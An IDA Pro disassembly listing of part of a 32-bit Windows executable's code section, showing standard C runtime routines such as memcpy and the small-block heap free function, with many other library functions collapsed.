.text:0040303E                                         ; sub_402F9A+87j
.text:0040303E                 mov     eax, edi
.text:00403040
.text:00403040 loc_403040:                             ; CODE XREF: sub_402F9A+AFj
.text:00403040                 pop     edi
.text:00403041                 pop     esi
.text:00403042                 pop     ebp
.text:00403043                 retn
.text:00403044 ; ---------------------------------------------------------------------------
.text:00403044
.text:00403044 loc_403044:                             ; CODE XREF: sub_402F9A+69j
.text:00403044                 push    esi
.text:00403045                 jmp     short loc_403033
.text:00403047 ; ---------------------------------------------------------------------------
.text:00403047
.text:00403047 loc_403047:                             ; CODE XREF: sub_402F9A+92j
.text:00403047                 xor     eax, eax
.text:00403049                 jmp     short loc_403040
.text:00403049 sub_402F9A      endp
.text:00403049
.text:0040304B ; [00000058 BYTES: COLLAPSED FUNCTION __fcloseall. PRESS KEYPAD "+" TO EXPAND]
.text:004030A3                 align 10h
.text:004030B0 ; [00000007 BYTES: COLLAPSED FUNCTION _strcpy. PRESS KEYPAD "+" TO EXPAND]
.text:004030B7                 align 10h
.text:004030C0 ; [000000E0 BYTES: COLLAPSED FUNCTION _strcat. PRESS KEYPAD "+" TO EXPAND]
.text:004031A0 ; [00000199 BYTES: COLLAPSED FUNCTION __setmbcp. PRESS KEYPAD "+" TO EXPAND]
.text:00403339 ; [0000004A BYTES: COLLAPSED FUNCTION _getSystemCP. PRESS KEYPAD "+" TO EXPAND]
.text:00403383 ; [00000033 BYTES: COLLAPSED FUNCTION _CPtoLCID. PRESS KEYPAD "+" TO EXPAND]
.text:004033B6 ; [00000029 BYTES: COLLAPSED FUNCTION _setSBCS. PRESS KEYPAD "+" TO EXPAND]
.text:004033DF ; [00000185 BYTES: COLLAPSED FUNCTION _setSBUpLow. PRESS KEYPAD "+" TO EXPAND]
.text:00403564 ; [0000001C BYTES: COLLAPSED FUNCTION ___initmbctable. PRESS KEYPAD "+" TO EXPAND]
.text:00403580 ; ---------------------------------------------------------------------------
.text:00403580
.text:00403580 ; void *__cdecl memcpy(void *,const void *,size_t)
.text:00403580 _memcpy:                                ; CODE XREF: ___crtGetEnvironmentStringsA+116p
.text:00403580                 push    ebp
.text:00403581                 mov     ebp, esp
.text:00403583                 push    edi
.text:00403584                 push    esi
.text:00403585                 mov     esi, [ebp+0Ch]
.text:00403588                 mov     ecx, [ebp+10h]
.text:0040358B                 mov     edi, [ebp+8]
.text:0040358E                 mov     eax, ecx
.text:00403590                 mov     edx, ecx
.text:00403592                 add     eax, esi
.text:00403594                 cmp     edi, esi
.text:00403596                 jbe     short loc_4035A0
.text:00403598                 cmp     edi, eax
.text:0040359A                 jb      loc_403718
.text:004035A0
.text:004035A0 loc_4035A0:                             ; CODE XREF: .text:00403596j
.text:004035A0                 test    edi, 3
.text:004035A6                 jnz     short loc_4035BC
.text:004035A8                 shr     ecx, 2
.text:004035AB                 and     edx, 3
.text:004035AE                 cmp     ecx, 8
.text:004035B1                 jb      short near ptr dword_4035DC
.text:004035B3                 rep movsd
.text:004035B5                 jmp     ds:off_4036C8[edx*4]
.text:004035BC ; ---------------------------------------------------------------------------
.text:004035BC
.text:004035BC loc_4035BC:                             ; CODE XREF: .text:004035A6j
.text:004035BC                 mov     eax, edi
.text:004035BE                 mov     edx, 3
.text:004035C3                 sub     ecx, 4
.text:004035C6                 jb      short loc_4035D4
.text:004035C8                 and     eax, 3
.text:004035CB                 add     ecx, eax
.text:004035CD                 jmp     ds:dword_4035E0[eax*4]
.text:004035D4 ; ---------------------------------------------------------------------------
.text:004035D4
.text:004035D4 loc_4035D4:                             ; CODE XREF: .text:004035C6j
.text:004035D4                 jmp     ds:TrailUp0[ecx*4]
.text:004035D4 ; ---------------------------------------------------------------------------
.text:004035DB                 align 4
.text:004035DC dword_4035DC    dd 5C8D24FFh            ; CODE XREF: .text:004035B1j
.text:004035E0 dword_4035E0    dd 90004036h            ; DATA XREF: .text:004035CDr
.text:004035E4                 dd offset dword_4035F0
.text:004035E8                 dd offset LeadUp2
.text:004035EC                 dd offset LeadUp3
.text:004035F0 dword_4035F0    dd 68AD123h, 468A0788h, 1478801h, 0C102468Ah, 478802E9h
.text:004035F0                                         ; DATA XREF: .text:004035E4o
.text:004035F0                 dd 3C68302h, 8303C783h, 0CC7208F9h, 24FFA5F3h, 4036C895h
.text:004035F0                 dd 498D00h
.text:0040361C LeadUp2         dd 68AD123h, 468A0788h, 2E9C101h, 83014788h, 0C78302C6h
.text:0040361C                                         ; DATA XREF: .text:004035E8o
.text:0040361C                 dd 8F98302h, 0A5F3A672h, 0C89524FFh, 90004036h
.text:00403640 LeadUp3         dd 68AD123h, 0C1460788h, 834702E9h, 8C7208F9h, 24FFA5F3h
.text:00403640                                         ; DATA XREF: .text:004035ECo
.text:00403640                 dd 4036C895h, 498D00h, 4036BFh, 4036ACh, 4036A4h, 40369Ch
.text:00403640                 dd 403694h, 40368Ch, 403684h, 40367Ch
.text:0040367C ; ---------------------------------------------------------------------------
.text:0040367C
.text:0040367C UnwindUp7:
.text:0040367C                 mov     eax, [esi+ecx*4-1Ch]
.text:00403680                 mov     [edi+ecx*4-1Ch], eax
.text:00403684
.text:00403684 UnwindUp6:
.text:00403684                 mov     eax, [esi+ecx*4-18h]
.text:00403688                 mov     [edi+ecx*4-18h], eax
.text:0040368C
.text:0040368C UnwindUp5:
.text:0040368C                 mov     eax, [esi+ecx*4-14h]
.text:00403690                 mov     [edi+ecx*4-14h], eax
.text:00403694
.text:00403694 UnwindUp4:
.text:00403694                 mov     eax, [esi+ecx*4-10h]
.text:00403698                 mov     [edi+ecx*4-10h], eax
.text:0040369C
.text:0040369C UnwindUp3:
.text:0040369C                 mov     eax, [esi+ecx*4-0Ch]
.text:004036A0                 mov     [edi+ecx*4-0Ch], eax
.text:004036A4
.text:004036A4 UnwindUp2:
.text:004036A4                 mov     eax, [esi+ecx*4-8]
.text:004036A8                 mov     [edi+ecx*4-8], eax
.text:004036AC
.text:004036AC UnwindUp1:
.text:004036AC                 mov     eax, [esi+ecx*4-4]
.text:004036B0                 mov     [edi+ecx*4-4], eax
.text:004036B4                 lea     eax, ds:0[ecx*4]
.text:004036BB                 add     esi, eax
.text:004036BD                 add     edi, eax
.text:004036BF
.text:004036BF UnwindUp0:
.text:004036BF                 jmp     ds:off_4036C8[edx*4]
.text:004036BF ; ---------------------------------------------------------------------------
.text:004036C6                 align 4
.text:004036C8 off_4036C8      dd offset TrailUp0      ; DATA XREF: .text:004035B5r
.text:004036C8                                         ; .text:UnwindUp0r
.text:004036CC                 dd offset TrailUp1
.text:004036D0                 dd offset TrailUp2
.text:004036D4                 dd offset TrailUp3
.text:004036D8 TrailUp0        dd 5E08458Bh            ; CODE XREF: .text:004035B5j
.text:004036D8                                         ; DATA XREF: .text:loc_4035D4r ...
.text:004036DC ; ---------------------------------------------------------------------------
.text:004036DC                 pop     edi
.text:004036DD                 leave
.text:004036DE                 retn
.text:004036DE ; ---------------------------------------------------------------------------
.text:004036DF                 align 10h
.text:004036E0 ; [0000000B BYTES: COLLAPSED FUNCTION TrailUp1. PRESS KEYPAD "+" TO EXPAND]
.text:004036EB                 align 4
.text:004036EC ; [00000011 BYTES: COLLAPSED FUNCTION TrailUp2. PRESS KEYPAD "+" TO EXPAND]
.text:004036FD                 align 10h
.text:00403700 ; [00000017 BYTES: COLLAPSED FUNCTION TrailUp3. PRESS KEYPAD "+" TO EXPAND]
.text:00403717                 align 4
.text:00403718
.text:00403718 loc_403718:                             ; CODE XREF: .text:0040359Aj
.text:00403718                 lea     esi, [ecx+esi-4]
.text:0040371C                 lea     edi, [ecx+edi-4]
.text:00403720                 test    edi, 3
.text:00403726                 jnz     short loc_40374C
.text:00403728                 shr     ecx, 2
.text:0040372B                 and     edx, 3
.text:0040372E                 cmp     ecx, 8
.text:00403731                 jb      short loc_403740
.text:00403733                 std
.text:00403734                 rep movsd
.text:00403736                 cld
.text:00403737                 jmp     ds:off_403860[edx*4]
.text:00403737 ; ---------------------------------------------------------------------------
.text:0040373E                 align 10h
.text:00403740
.text:00403740 loc_403740:                             ; CODE XREF: .text:00403731j
.text:00403740                                         ; .text:00403788j ...
.text:00403740                 neg     ecx
.text:00403742                 jmp     ds:off_403810[ecx*4]
.text:00403742 ; ---------------------------------------------------------------------------
.text:00403749                 align 4
.text:0040374C
.text:0040374C loc_40374C:                             ; CODE XREF: .text:00403726j
.text:0040374C                 mov     eax, edi
.text:0040374E                 mov     edx, 3
.text:00403753                 cmp     ecx, 4
.text:00403756                 jb      short near ptr dword_403764
.text:00403758                 and     eax, 3
.text:0040375B                 sub     ecx, eax
.text:0040375D                 jmp     ds:dword_403768[eax*4]
.text:0040375D ; ---------------------------------------------------------------------------
.text:00403764 dword_403764    dd 608D24FFh            ; CODE XREF: .text:00403756j
.text:00403768 dword_403768    dd 90004038h            ; DATA XREF: .text:0040375Dr
.text:0040376C ; ---------------------------------------------------------------------------
.text:0040376C                 js      short loc_4037A5
.text:0040376E                 inc     eax
.text:0040376F                 add     [eax-3FFFBFC9h], bl
.text:00403775                 aaa
.text:00403776                 inc     eax
.text:00403777                 add     [edx-2EDCFCBAh], cl
.text:0040377D                 mov     [edi+3], al
.text:00403780                 dec     esi
.text:00403781                 shr     ecx, 2
.text:00403784                 dec     edi
.text:00403785                 cmp     ecx, 8
.text:00403788                 jb      short loc_403740
.text:0040378A                 std
.text:0040378B                 rep movsd
.text:0040378D                 cld
.text:0040378E                 jmp     ds:off_403860[edx*4]
.text:0040378E ; ---------------------------------------------------------------------------
.text:00403795                 align 4
.text:00403798 LeadDown2       dd 2303468Ah, 34788D1h, 0C102468Ah
.text:004037A4                 db 0E9h
.text:004037A5 ; ---------------------------------------------------------------------------
.text:004037A5
.text:004037A5 loc_4037A5:                             ; CODE XREF: .text:0040376Cj
.text:004037A5                 add     cl, [eax-117CFDB9h]
.text:004037AB                 add     al, [ebx-67CFD11h]
.text:004037B1                 or      [edx-74h], dh
.text:004037B4                 std
.text:004037B5                 rep movsd
.text:004037B7                 cld
.text:004037B8                 jmp     ds:off_403860[edx*4]
.text:004037B8 ; ---------------------------------------------------------------------------
.text:004037BF                 align 10h
.text:004037C0
.text:004037C0 LeadDown3:
.text:004037C0                 mov     al, [esi+3]
.text:004037C3                 and     edx, ecx
.text:004037C5                 mov     [edi+3], al
.text:004037C8                 mov     al, [esi+2]
.text:004037CB                 mov     [edi+2], al
.text:004037CE                 mov     al, [esi+1]
.text:004037D1                 shr     ecx, 2
.text:004037D4                 mov     [edi+1], al
.text:004037D7                 sub     esi, 3
.text:004037DA                 sub     edi, 3
.text:004037DD                 cmp     ecx, 8
.text:004037E0                 jb      loc_403740
.text:004037E6                 std
.text:004037E7                 rep movsd
.text:004037E9                 cld
.text:004037EA                 jmp     ds:off_403860[edx*4]
.text:004037EA ; ---------------------------------------------------------------------------
.text:004037F1                 align 4
.text:004037F4                 dd offset UnwindDown7
.text:004037F8                 dd offset UnwindDown6
.text:004037FC                 dd offset UnwindDown5
.text:00403800                 dd offset UnwindDown4
.text:00403804                 dd offset UnwindDown3
.text:00403808                 dd offset UnwindDown2
.text:0040380C                 dd offset UnwindDown1
.text:00403810 off_403810      dd offset UnwindDown0   ; DATA XREF: .text:00403742r
.text:00403814 ; ---------------------------------------------------------------------------
.text:00403814
.text:00403814 UnwindDown7:                            ; DATA XREF: .text:004037F4o
.text:00403814                 mov     eax, [esi+ecx*4+1Ch]
.text:00403818                 mov     [edi+ecx*4+1Ch], eax
.text:0040381C
.text:0040381C UnwindDown6:                            ; DATA XREF: .text:004037F8o
.text:0040381C                 mov     eax, [esi+ecx*4+18h]
.text:00403820                 mov     [edi+ecx*4+18h], eax
.text:00403824
.text:00403824 UnwindDown5:                            ; DATA XREF: .text:004037FCo
.text:00403824                 mov     eax, [esi+ecx*4+14h]
.text:00403828                 mov     [edi+ecx*4+14h], eax
.text:0040382C
.text:0040382C UnwindDown4:                            ; DATA XREF: .text:00403800o
.text:0040382C                 mov     eax, [esi+ecx*4+10h]
.text:00403830                 mov     [edi+ecx*4+10h], eax
.text:00403834
.text:00403834 UnwindDown3:                            ; DATA XREF: .text:00403804o
.text:00403834                 mov     eax, [esi+ecx*4+0Ch]
.text:00403838                 mov     [edi+ecx*4+0Ch], eax
.text:0040383C
.text:0040383C UnwindDown2:                            ; DATA XREF: .text:00403808o
.text:0040383C                 mov     eax, [esi+ecx*4+8]
.text:00403840                 mov     [edi+ecx*4+8], eax
.text:00403844
.text:00403844 UnwindDown1:                            ; DATA XREF: .text:0040380Co
.text:00403844                 mov     eax, [esi+ecx*4+4]
.text:00403848                 mov     [edi+ecx*4+4], eax
.text:0040384C                 lea     eax, ds:0[ecx*4]
.text:00403853                 add     esi, eax
.text:00403855                 add     edi, eax
.text:00403857 ; [0000005E BYTES: COLLAPSED FUNCTION UnwindDown0. PRESS KEYPAD "+" TO EXPAND]
.text:004038B5 ; [00000017 BYTES: COLLAPSED FUNCTION _strtol. PRESS KEYPAD "+" TO EXPAND]
.text:004038CC ; [00000208 BYTES: COLLAPSED FUNCTION _strtoxl. PRESS KEYPAD "+" TO EXPAND]
.text:00403AD4                 align 10h
.text:00403AE0 ; START OF FUNCTION CHUNK FOR _strchr
.text:00403AE0
.text:00403AE0 loc_403AE0:                             ; CODE XREF: _strchr+1Dj
.text:00403AE0                 lea     eax, [edx-1]
.text:00403AE3                 pop     ebx
.text:00403AE4                 retn
.text:00403AE4 ; END OF FUNCTION CHUNK FOR _strchr
.text:00403AE4 ; ---------------------------------------------------------------------------
.text:00403AE5                 align 10h
.text:00403AF0 ; [000000BC BYTES: COLLAPSED FUNCTION _strchr. PRESS KEYPAD "+" TO EXPAND]
.text:00403BAC                 align 10h
.text:00403BB0 ; [00000080 BYTES: COLLAPSED FUNCTION _strstr. PRESS KEYPAD "+" TO EXPAND]
.text:00403C30 ; [00000038 BYTES: COLLAPSED FUNCTION _strncmp. PRESS KEYPAD "+" TO EXPAND]
.text:00403C68                 align 10h
.text:00403C70 ; [0000002F BYTES: COLLAPSED FUNCTION __alloca_probe. PRESS KEYPAD "+" TO EXPAND]
.text:00403C9F ; [00000048 BYTES: COLLAPSED FUNCTION ___sbh_heap_init. PRESS KEYPAD "+" TO EXPAND]
.text:00403CE7 ; [0000002B BYTES: COLLAPSED FUNCTION ___sbh_find_block. PRESS KEYPAD "+" TO EXPAND]
.text:00403D12
.text:00403D12 ; ¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦ S U B R O U T I N E ¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦
.text:00403D12
.text:00403D12 ; Attributes: bp-based frame
.text:00403D12
.text:00403D12 sub_403D12      proc near               ; CODE XREF: sub_402C41+23p
.text:00403D12
.text:00403D12 var_10          = dword ptr -10h
.text:00403D12 var_C           = dword ptr -0Ch
.text:00403D12 var_8           = dword ptr -8
.text:00403D12 var_4           = dword ptr -4
.text:00403D12 arg_0           = dword ptr  8
.text:00403D12 arg_4           = dword ptr  0Ch
.text:00403D12
.text:00403D12                 push    ebp
.text:00403D13                 mov     ebp, esp
.text:00403D15                 sub     esp, 10h
.text:00403D18                 mov     ecx, [ebp+arg_0]
.text:00403D1B                 push    ebx
.text:00403D1C                 push    esi
.text:00403D1D                 mov     esi, [ebp+arg_4]
.text:00403D20                 mov     eax, [ecx+10h]
.text:00403D23                 push    edi
.text:00403D24                 mov     edi, esi
.text:00403D26                 add     esi, 0FFFFFFFCh
.text:00403D29                 sub     edi, [ecx+0Ch]
.text:00403D2C                 shr     edi, 0Fh
.text:00403D2F                 mov     ecx, edi
.text:00403D31                 imul    ecx, 204h
.text:00403D37                 lea     ecx, [ecx+eax+144h]
.text:00403D3E                 mov     [ebp+var_10], ecx
.text:00403D41                 mov     ecx, [esi]
.text:00403D43                 dec     ecx
.text:00403D44                 test    cl, 1
.text:00403D47                 mov     [ebp+var_4], ecx
.text:00403D4A                 jnz     loc_404036
.text:00403D50                 mov     edx, [ecx+esi]
.text:00403D53                 lea     ebx, [ecx+esi]
.text:00403D56                 mov     [ebp+var_C], edx
.text:00403D59                 mov     edx, [esi-4]
.text:00403D5C                 mov     [ebp+var_8], edx
.text:00403D5F                 mov     edx, [ebp+var_C]
.text:00403D62                 test    dl, 1
.text:00403D65                 mov     [ebp+arg_4], ebx
.text:00403D68                 jnz     short loc_403DE8
.text:00403D6A                 sar     edx, 4
.text:00403D6D                 dec     edx
.text:00403D6E                 cmp     edx, 3Fh
.text:00403D71                 jbe     short loc_403D76
.text:00403D73                 push    3Fh
.text:00403D75                 pop     edx
.text:00403D76
.text:00403D76 loc_403D76:                             ; CODE XREF: sub_403D12+5Fj
.text:00403D76                 mov     ecx, [ebx+4]
.text:00403D79                 cmp     ecx, [ebx+8]
.text:00403D7C                 jnz     short loc_403DCA
.text:00403D7E                 cmp     edx, 20h
.text:00403D81                 jnb     short loc_403DA1
.text:00403D83                 mov     ebx, 80000000h
.text:00403D88                 mov     ecx, edx
.text:00403D8A                 shr     ebx, cl
.text:00403D8C                 lea     ecx, [edx+eax+4]
.text:00403D90                 not     ebx
.text:00403D92                 and     [eax+edi*4+44h], ebx
.text:00403D96                 dec     byte ptr [ecx]
.text:00403D98                 jnz     short loc_403DC2
.text:00403D9A                 mov     ecx, [ebp+arg_0]
.text:00403D9D                 and     [ecx], ebx
.text:00403D9F                 jmp     short loc_403DC2
.text:00403DA1 ; ---------------------------------------------------------------------------
.text:00403DA1
.text:00403DA1 loc_403DA1:                             ; CODE XREF: sub_403D12+6Fj
.text:00403DA1                 lea     ecx, [edx-20h]
.text:00403DA4                 mov     ebx, 80000000h
.text:00403DA9                 shr     ebx, cl
.text:00403DAB                 lea     ecx, [edx+eax+4]
.text:00403DAF                 not     ebx
.text:00403DB1                 and     [eax+edi*4+0C4h], ebx
.text:00403DB8                 dec     byte ptr [ecx]
.text:00403DBA                 jnz     short loc_403DC2
.text:00403DBC                 mov     ecx, [ebp+arg_0]
.text:00403DBF                 and     [ecx+4], ebx
.text:00403DC2
.text:00403DC2 loc_403DC2:                             ; CODE XREF: sub_403D12+86j
.text:00403DC2                                         ; sub_403D12+8Dj ...
.text:00403DC2                 mov     ecx, [ebp+var_4]
.text:00403DC5                 mov     ebx, [ebp+arg_4]
.text:00403DC8                 jmp     short loc_403DCD
.text:00403DCA ; ---------------------------------------------------------------------------
.text:00403DCA
.text:00403DCA loc_403DCA:                             ; CODE XREF: sub_403D12+6Aj
.text:00403DCA                 mov     ecx, [ebp+var_4]
.text:00403DCD
.text:00403DCD loc_403DCD:                             ; CODE XREF: sub_403D12+B6j
.text:00403DCD                 mov     edx, [ebx+8]
.text:00403DD0                 mov     ebx, [ebx+4]
.text:00403DD3                 add     ecx, [ebp+var_C]
.text:00403DD6                 mov     [edx+4], ebx
.text:00403DD9                 mov     edx, [ebp+arg_4]
.text:00403DDC                 mov     [ebp+var_4], ecx
.text:00403DDF                 mov     ebx, [edx+4]
.text:00403DE2                 mov     edx, [edx+8]
.text:00403DE5                 mov     [ebx+8], edx
.text:00403DE8
.text:00403DE8 loc_403DE8:                             ; CODE XREF: sub_403D12+56j
.text:00403DE8                 mov     edx, ecx
.text:00403DEA                 sar     edx, 4
.text:00403DED                 dec     edx
.text:00403DEE                 cmp     edx, 3Fh
.text:00403DF1                 jbe     short loc_403DF6
.text:00403DF3                 push    3Fh
.text:00403DF5                 pop     edx
.text:00403DF6
.text:00403DF6 loc_403DF6:                             ; CODE XREF: sub_403D12+DFj
.text:00403DF6                 mov     ebx, [ebp+var_8]
.text:00403DF9                 and     ebx, 1
.text:00403DFC                 mov     [ebp+var_C], ebx
.text:00403DFF                 jnz     loc_403E99
.text:00403E05                 sub     esi, [ebp+var_8]
.text:00403E08                 mov     ebx, [ebp+var_8]
.text:00403E0B                 sar     ebx, 4
.text:00403E0E                 push    3Fh
.text:00403E10                 mov     [ebp+arg_4], esi
.text:00403E13                 dec     ebx
.text:00403E14                 pop     esi
.text:00403E15                 cmp     ebx, esi
.text:00403E17                 jbe     short loc_403E1B
.text:00403E19                 mov     ebx, esi
.text:00403E1B
.text:00403E1B loc_403E1B:                             ; CODE XREF: sub_403D12+105j
.text:00403E1B                 add     ecx, [ebp+var_8]
.text:00403E1E                 mov     edx, ecx
.text:00403E20                 mov     [ebp+var_4], ecx
.text:00403E23                 sar     edx, 4
.text:00403E26                 dec     edx
.text:00403E27                 cmp     edx, esi
.text:00403E29                 jbe     short loc_403E2D
.text:00403E2B                 mov     edx, esi
.text:00403E2D
.text:00403E2D loc_403E2D:                             ; CODE XREF: sub_403D12+117j
.text:00403E2D                 cmp     ebx, edx
.text:00403E2F                 jz      short loc_403E94
.text:00403E31                 mov     ecx, [ebp+arg_4]
.text:00403E34                 mov     esi, [ecx+4]
.text:00403E37                 cmp     esi, [ecx+8]
.text:00403E3A                 jnz     short loc_403E7C
.text:00403E3C                 cmp     ebx, 20h
.text:00403E3F                 jnb     short loc_403E5D
.text:00403E41                 mov     esi, 80000000h
.text:00403E46                 mov     ecx, ebx
.text:00403E48                 shr     esi, cl
.text:00403E4A                 not     esi
.text:00403E4C                 and     [eax+edi*4+44h], esi
.text:00403E50                 dec     byte ptr [ebx+eax+4]
.text:00403E54                 jnz     short loc_403E7C
.text:00403E56                 mov     ecx, [ebp+arg_0]
.text:00403E59                 and     [ecx], esi
.text:00403E5B                 jmp     short loc_403E7C
.text:00403E5D ; ---------------------------------------------------------------------------
.text:00403E5D
.text:00403E5D loc_403E5D:                             ; CODE XREF: sub_403D12+12Dj
.text:00403E5D                 lea     ecx, [ebx-20h]
.text:00403E60                 mov     esi, 80000000h
.text:00403E65                 shr     esi, cl
.text:00403E67                 not     esi
.text:00403E69                 and     [eax+edi*4+0C4h], esi
.text:00403E70                 dec     byte ptr [ebx+eax+4]
.text:00403E74                 jnz     short loc_403E7C
.text:00403E76                 mov     ecx, [ebp+arg_0]
.text:00403E79                 and     [ecx+4], esi
.text:00403E7C
.text:00403E7C loc_403E7C:                             ; CODE XREF: sub_403D12+128j
.text:00403E7C                                         ; sub_403D12+142j ...
.text:00403E7C                 mov     ecx, [ebp+arg_4]
.text:00403E7F                 mov     esi, [ecx+8]
.text:00403E82                 mov     ecx, [ecx+4]
.text:00403E85                 mov     [esi+4], ecx
.text:00403E88                 mov     ecx, [ebp+arg_4]
.text:00403E8B                 mov     esi, [ecx+4]
.text:00403E8E                 mov     ecx, [ecx+8]
.text:00403E91                 mov     [esi+8], ecx
.text:00403E94
.text:00403E94 loc_403E94:                             ; CODE XREF: sub_403D12+11Dj
.text:00403E94                 mov     esi, [ebp+arg_4]
.text:00403E97                 jmp     short loc_403E9C
.text:00403E99 ; ---------------------------------------------------------------------------
.text:00403E99
.text:00403E99 loc_403E99:                             ; CODE XREF: sub_403D12+EDj
.text:00403E99                 mov     ebx, [ebp+arg_0]
.text:00403E9C
.text:00403E9C loc_403E9C:                             ; CODE XREF: sub_403D12+185j
.text:00403E9C                 cmp     [ebp+var_C], 0
.text:00403EA0                 jnz     short loc_403EAA
.text:00403EA2                 cmp     ebx, edx
.text:00403EA4                 jz      loc_403F2B
.text:00403EAA
.text:00403EAA loc_403EAA:                             ; CODE XREF: sub_403D12+18Ej
.text:00403EAA                 mov     ecx, [ebp+var_10]
.text:00403EAD                 mov     ebx, [ecx+edx*8+4]
.text:00403EB1                 lea     ecx, [ecx+edx*8]
.text:00403EB4                 mov     [esi+4], ebx
.text:00403EB7                 mov     [esi+8], ecx
.text:00403EBA                 mov     [ecx+4], esi
.text:00403EBD                 mov     ecx, [esi+4]
.text:00403EC0                 mov     [ecx+8], esi
.text:00403EC3                 mov     ecx, [esi+4]
.text:00403EC6                 cmp     ecx, [esi+8]
.text:00403EC9                 jnz     short loc_403F2B
.text:00403ECB                 mov     cl, [edx+eax+4]
.text:00403ECF                 cmp     edx, 20h
.text:00403ED2                 mov     byte ptr [ebp+arg_4+3], cl
.text:00403ED5                 inc     cl
.text:00403ED7                 mov     [edx+eax+4], cl
.text:00403EDB                 jnb     short loc_403F02
.text:00403EDD                 cmp     byte ptr [ebp+arg_4+3], 0
.text:00403EE1                 jnz     short loc_403EF1
.text:00403EE3                 mov     ebx, 80000000h
.text:00403EE8                 mov     ecx, edx
.text:00403EEA                 shr     ebx, cl
.text:00403EEC                 mov     ecx, [ebp+arg_0]
.text:00403EEF                 or      [ecx], ebx
.text:00403EF1
.text:00403EF1 loc_403EF1:                             ; CODE XREF: sub_403D12+1CFj
.text:00403EF1                 mov     ebx, 80000000h
.text:00403EF6                 mov     ecx, edx
.text:00403EF8                 shr     ebx, cl
.text:00403EFA                 lea     eax, [eax+edi*4+44h]
.text:00403EFE                 or      [eax], ebx
.text:00403F00                 jmp     short loc_403F2B
.text:00403F02 ; ---------------------------------------------------------------------------
.text:00403F02
.text:00403F02 loc_403F02:                             ; CODE XREF: sub_403D12+1C9j
.text:00403F02                 cmp     byte ptr [ebp+arg_4+3], 0
.text:00403F06                 jnz     short loc_403F18
.text:00403F08                 lea     ecx, [edx-20h]
.text:00403F0B                 mov     ebx, 80000000h
.text:00403F10                 shr     ebx, cl
.text:00403F12                 mov     ecx, [ebp+arg_0]
.text:00403F15                 or      [ecx+4], ebx
.text:00403F18
.text:00403F18 loc_403F18:                             ; CODE XREF: sub_403D12+1F4j
.text:00403F18                 lea     ecx, [edx-20h]
.text:00403F1B                 mov     edx, 80000000h
.text:00403F20                 shr     edx, cl
.text:00403F22                 lea     eax, [eax+edi*4+0C4h]
.text:00403F29                 or      [eax], edx
.text:00403F2B
.text:00403F2B loc_403F2B:                             ; CODE XREF: sub_403D12+192j
.text:00403F2B                                         ; sub_403D12+1B7j ...
.text:00403F2B                 mov     eax, [ebp+var_4]
.text:00403F2E                 mov     [esi], eax
.text:00403F30                 mov     [eax+esi-4], eax
.text:00403F34                 mov     eax, [ebp+var_10]
.text:00403F37                 dec     dword ptr [eax]
.text:00403F39                 jnz     loc_404036
.text:00403F3F                 mov     eax, dword_409B9C
.text:00403F44                 test    eax, eax
.text:00403F46                 jz      loc_404028
.text:00403F4C                 mov     ecx, dword_409B94
.text:00403F52                 mov     esi, ds:VirtualFree
.text:00403F58                 shl     ecx, 0Fh
.text:00403F5B                 add     ecx, [eax+0Ch]
.text:00403F5E                 mov     ebx, 8000h
.text:00403F63                 push    4000h           ; dwFreeType
.text:00403F68                 push    ebx             ; dwSize
.text:00403F69                 push    ecx             ; lpAddress
.text:00403F6A                 call    esi ; VirtualFree
.text:00403F6C                 mov     ecx, dword_409B94
.text:00403F72                 mov     eax, dword_409B9C
.text:00403F77                 mov     edx, 80000000h
.text:00403F7C                 shr     edx, cl
.text:00403F7E                 or      [eax+8], edx
.text:00403F81                 mov     eax, dword_409B9C
.text:00403F86                 mov     ecx, dword_409B94
.text:00403F8C                 mov     eax, [eax+10h]
.text:00403F8F                 and     dword ptr [eax+ecx*4+0C4h], 0
.text:00403F97                 mov     eax, dword_409B9C
.text:00403F9C                 mov     eax, [eax+10h]
.text:00403F9F                 dec     byte ptr [eax+43h]
.text:00403FA2                 mov     eax, dword_409B9C
.text:00403FA7                 mov     ecx, [eax+10h]
.text:00403FAA                 cmp     byte ptr [ecx+43h], 0
.text:00403FAE                 jnz     short loc_403FB9
.text:00403FB0                 and     dword ptr [eax+4], 0FFFFFFFEh
.text:00403FB4                 mov     eax, dword_409B9C
.text:00403FB9
.text:00403FB9 loc_403FB9:                             ; CODE XREF: sub_403D12+29Cj
.text:00403FB9                 cmp     dword ptr [eax+8], 0FFFFFFFFh
.text:00403FBD                 jnz     short loc_404028
.text:00403FBF                 push    ebx             ; dwFreeType
.text:00403FC0                 push    0               ; dwSize
.text:00403FC2                 push    dword ptr [eax+0Ch] ; lpAddress
.text:00403FC5                 call    esi ; VirtualFree
.text:00403FC7                 mov     eax, dword_409B9C
.text:00403FCC                 push    dword ptr [eax+10h] ; lpMem
.text:00403FCF                 push    0               ; dwFlags
.text:00403FD1                 push    hHeap           ; hHeap
.text:00403FD7                 call    ds:HeapFree
.text:00403FDD                 mov     eax, dword_409BA0
.text:00403FE2                 mov     edx, lpMem
.text:00403FE8                 lea     eax, [eax+eax*4]
.text:00403FEB                 shl     eax, 2
.text:00403FEE                 mov     ecx, eax
.text:00403FF0                 mov     eax, dword_409B9C
.text:00403FF5                 sub     ecx, eax
.text:00403FF7                 lea     ecx, [ecx+edx-14h]
.text:00403FFB                 push    ecx
.text:00403FFC                 lea     ecx, [eax+14h]
.text:00403FFF                 push    ecx
.text:00404000                 push    eax
.text:00404001                 call    _memcpy_0
.text:00404006                 mov     eax, [ebp+arg_0]
.text:00404009                 add     esp, 0Ch
.text:0040400C                 dec     dword_409BA0
.text:00404012                 cmp     eax, dword_409B9C
.text:00404018                 jbe     short loc_40401E
.text:0040401A                 sub     [ebp+arg_0], 14h
.text:0040401E
.text:0040401E loc_40401E:                             ; CODE XREF: sub_403D12+306j
.text:0040401E                 mov     eax, lpMem
.text:00404023                 mov     dword_409B98, eax
.text:00404028
.text:00404028 loc_404028:                             ; CODE XREF: sub_403D12+234j
.text:00404028                                         ; sub_403D12+2ABj
.text:00404028                 mov     eax, [ebp+arg_0]
.text:0040402B                 mov     dword_409B94, edi
.text:00404031                 mov     dword_409B9C, eax
.text:00404036
.text:00404036 loc_404036:                             ; CODE XREF: sub_403D12+38j
.text:00404036                                         ; sub_403D12+227j
.text:00404036                 pop     edi
.text:00404037                 pop     esi
.text:00404038                 pop     ebx
.text:00404039                 leave
.text:0040403A                 retn
.text:0040403A sub_403D12      endp
.text:0040403A
.text:0040403B ; [00000309 BYTES: COLLAPSED FUNCTION ___sbh_alloc_block. PRESS KEYPAD "+" TO EXPAND]
